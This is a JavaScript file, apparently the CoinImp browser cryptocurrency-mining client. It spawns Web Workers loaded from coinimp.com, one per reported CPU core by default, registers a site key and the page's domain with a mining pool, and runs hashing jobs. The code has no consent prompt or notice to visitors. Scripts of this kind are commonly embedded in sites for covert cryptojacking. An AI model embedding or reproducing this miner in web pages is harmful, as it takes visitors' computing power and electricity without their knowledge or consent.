var CoinImp = function() {
    var e = this,
        t = null,
        i = !1,
        n = null,
        r = 1,
        o = [],
        s = 0,
        a = 0,
        l = 0,
        d = null,
        p = null,
        c = null,
        h = 0,
        u = 0,
        f = null,
        g = location.hostname,
        m = !1;
    this.threads = -1, this.hashes = 0, this.throttle = 0, this.forceASMJS = !1;
    var v = function() {
            var e = navigator.userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            if (/trident/i.test(e[1])) {
                var t = /\brv[ :]+(\d+)/g.exec(navigator.userAgent) || [];
                return "IE " + (t[1] || "")
            }
            return "Chrome" === e[1] && null !== (t = navigator.userAgent.match(/\b(OPR|Edge)\/(\d+)/)) ? t.slice(1).join(" ").replace("OPR", "Opera") : (e = e[2] ? [e[1], e[2]] : [navigator.appName, navigator.appVersion, "-?"], null !== (t = navigator.userAgent.match(/version\/(\d+)/i)) && e.splice(1, 1, t[1]), e.join(" "))
        }(),
        y = function() {
            try {
                if ("object" != typeof WebAssembly) return !1;
                var e = new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]));
                return e instanceof WebAssembly.Module && new WebAssembly.Instance(e) instanceof WebAssembly.Instance
            } catch (e) {
                return !1
            }
        }(),
        b = function() {
            var e = v.split(" ")[0];
            return "Chrome" === e && parseInt(v.split(" ")[1]) >= 57 || "Firefox" === e && parseInt(v.split(" ")[1]) >= 52 || "Edge" === e && parseInt(v.split(" ")[1]) >= 16
        },
        w = function(e, t) {
            o = [];
            for (var i = 0; i < r; i++) {
                var n = new Worker("https://www.coinimp.com/worker.min.js");
                n.onmessage = S, o.push({
                    worker: n,
                    jobId: -1,
                    hashes: 0,
                    throttle: 0
                })
            }
            if (e && t) {
                var s = {
                    type: "REGISTER",
                    key: e,
                    user: t,
                    pool: "standard",
                    version: "1.2.1",
                    domain: g
                };
                o[0].worker.postMessage(s)
            }
        },
        S = function(n) {
            if ("authed" === n.data.type && (d = n.data.params.token, p = n.data.params.hashes, m = !0, "function" == typeof e.onAuthed && e.onAuthed(m, p)), "job" === n.data.type) {
                c = n.data.params;
                for (var f = 0; f < o.length; f++) o[f].jobId !== c.job_id && (o[f].jobId = c.job_id, o[f].worker.postMessage({
                    type: "JOB",
                    job: c,
                    throttle: e.throttle,
                    asmjs: e.forceASMJS || !y
                }))
            } else "hash" === n.data.type ? (s++, h += n.data.params.hashes, u += n.data.params.hashes, e.hashes = u) : "found" === n.data.type ? (a++, "function" == typeof e.onFound && e.onFound(a)) : "accepted" === n.data.type ? (l++, "function" == typeof e.onAccepted && e.onAccepted(l)) : "error" === n.data.type ? ("function" == typeof e.onError && e.onError(n.data.params.error), P()) : "banned" === n.data.type && ("function" == typeof e.onError && e.onError("banned"), P())
        },
        _ = function() {
            if (i) {
                for (var t = 0; t < o.length; t++) o[t].worker.postMessage({
                    type: "THROTTLE",
                    throttle: e.throttle
                });
                "function" == typeof e.onThrottle && e.onThrottle(e.throttle)
            }
        };
    this.init = function(e, n) {
        t = e, f = n
    };
    var C = function() {
        if (-1 === e.threads) {
            var t = navigator.hardwareConcurrency;
            r = t > 1 ? t : 2
        } else r = e.threads;
        w(t, f)
    };
    this.start = function() {
        if (!i && (i = !0, null === t)) return;
        P(), C()
    }, this.login = function(e) {
        if (i && o[0]) {
            var n = {
                type: "LOGIN",
                user: e
            };
            f = e, o[0].worker.postMessage(n)
        }
    };
    var P = function() {
        if (i = !1, o)
            for (var e = 0; e < o.length; e++) o[e].worker.terminate()
    };
    this.stop = function() {
        P()
    }, this.setNumThreads = function(t) {
        if (!i || t === r) return;
        if (P(), e.threads = t, t > 0) C();
        else {
            e.threads = -1, C()
        }
    }, this.setThrottle = function(t) {
        e.throttle = t, _()
    }, this.getHashesPerSecond = function() {
        return h.toFixed(2)
    }, this.getTotalHashes = function() {
        return u
    }, this.getAcceptedHashes = function() {
        return l
    }, this.getAuth = function() {
        return m
    }, setInterval(function() {
        h = s, s = 0
    }, 1e3)
};
